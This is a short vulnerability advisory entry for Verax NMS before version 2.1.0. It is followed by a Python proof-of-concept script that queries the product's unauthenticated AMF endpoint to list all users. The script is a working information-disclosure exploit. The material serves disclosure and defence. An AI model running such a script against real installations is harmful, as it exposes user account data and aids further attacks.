source: http://www.securityfocus.com/bid/58334/info

Verax NMS is prone to multiple security-bypass and information disclosure vulnerabilities.

Attackers can exploit these issues to bypass certain security restrictions, perform unauthorized actions, and obtain sensitive information; this may aid in launching further attacks.

Versions prior to Verax NMS 2.1.0 are vulnerable. 

#!/usr/bin/python

 #just based on http://www.example.com/tutorials/general/client.html#basic-example
 from pyamf import AMF0, AMF3
 from pyamf.remoting.client import RemotingService

 client = RemotingService('http://installationurl/enetworkmanagementsystem-fds/messagebroker/amf',
amf_version=AMF3)
 service = client.getService('userService')

 print service.getAllUsers()